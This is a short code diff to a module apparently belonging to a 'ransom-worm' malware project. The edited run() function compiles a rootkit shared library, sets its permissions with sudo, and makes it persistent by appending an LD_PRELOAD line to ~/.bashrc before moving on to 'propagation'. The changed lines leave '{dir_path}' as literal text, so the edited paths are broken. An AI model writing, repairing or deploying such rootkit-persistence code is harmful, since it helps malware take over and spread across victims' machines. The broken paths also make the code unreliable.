@@ -21,11 +21,14 @@ def run():
     data = "no_data"
     print("[+] Rootkit module activated...")
 
-    subprocess.run("gcc -fPIC -shared -o /home/vboxuser/ransom-worm/utils/rootkit.so /home/vboxuser/ransom-worm/utils/rootkit.c -ldl", shell=True)
+    file_path = Path(__file__).resolve()
+    dir_path = file_path.parent
+
+    subprocess.run("gcc -fPIC -shared -o ../utils/rootkit.so ../utils/rootkit.c -ldl", shell=True)
     print("1")
-    subprocess.run("sudo chmod 755 /home/vboxuser/ransom-worm/utils/rootkit.so", shell=True)
+    subprocess.run("sudo chmod 755 {dir_path}/../utils/rootkit.so", shell=True)
     print("2")
-    subprocess.run("echo 'export LD_PRELOAD=/home/vboxuser/ransom-worm/utils/rootkit.so' >> ~/.bashrc && . ~/.bashrc", shell=True)
+    subprocess.run("echo 'export LD_PRELOAD={dir_path}/../utils/rootkit.so' >> ~/.bashrc && . ~/.bashrc", shell=True)
     print("3")
 
     next_action = "propagation"
